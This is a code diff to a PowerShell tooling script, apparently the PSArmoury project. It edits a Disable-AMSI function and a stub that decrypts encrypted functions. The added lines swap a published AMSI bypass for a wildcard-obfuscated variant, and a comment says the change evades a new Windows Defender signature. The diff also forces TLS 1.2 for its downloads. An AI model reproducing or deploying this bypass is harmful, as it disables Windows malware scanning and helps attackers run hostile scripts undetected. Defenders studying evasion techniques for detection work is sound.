@@ -153,8 +153,8 @@ function Disable-AMSI
 {
     try
     {
-        #AMSI Bypass by Matthew Graeber
-        [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
+        #AMSI Bypass by Matthew Graeber - altered a bit because Windows Defender now has a signature for the original one
+        (([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
     }
     catch
     {
@@ -185,8 +185,8 @@ $DecryptionStub=@"
 if(`$Password -and `$Salt)
 {
 
-#AMSI Bypass by Matthew Graeber
-[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue(`$null,`$true)
+#AMSI Bypass by Matthew Graeber - altered a bit because Windows Defender now has a signature for the original one
+(([Ref].Assembly.gettypes() | where {`$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | where {`$_.Name -like "amsiInit*ailed"}).SetValue(`$null,`$true)
 
 `$Index = 0
 foreach(`$ef in `$EncryptedFunctions)
@@ -456,6 +456,8 @@ if($ScriptRequirements)
     $global:GitHubCredentials = $null
     $global:UserAgent = "Anything"
 
+	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+	
     foreach($PSA in $PSArmouryConfig)
     {
         switch($PSA.Type)
